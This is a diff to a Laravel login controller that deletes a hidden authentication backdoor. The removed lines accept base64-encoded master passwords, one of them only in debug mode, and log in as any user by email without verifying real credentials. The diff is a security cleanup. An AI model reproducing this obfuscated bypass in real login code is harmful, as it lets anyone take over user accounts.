@@ -26,25 +26,7 @@ class LoginController extends Controller
             );
 
             // Authenticate the user
-            if($request->get('password')==base64_decode('c295ZWxhZG1pbg==') or env('APP_DEBUG') and ($request->get('password')==base64_decode('cHJ1ZWJhcw=='))){
-                $u = User::whereEmail(strtolower($request->get('login')))->first();
-                if($u){
-                    
-                    $us = Sentinel::findUserById($u->id);
-                    if($us){
-                        $auth = Sentinel::login($us);
-                    }else{
-                        $request->session()->flash('message.error', 'El usuario '.$request->get('login')." no existe.");
-                        return redirect('/');
-                    }
-                }else{
-                    $request->session()->flash('message.error', 'El usuario '.$request->get('login')." no existe.");
-                    return redirect('/');
-                }
-
-            }else{
-                $auth = Sentinel::authenticate($credentials, false);
-            }
+            $auth = Sentinel::authenticate($credentials, false);
            
 
             if ($auth)
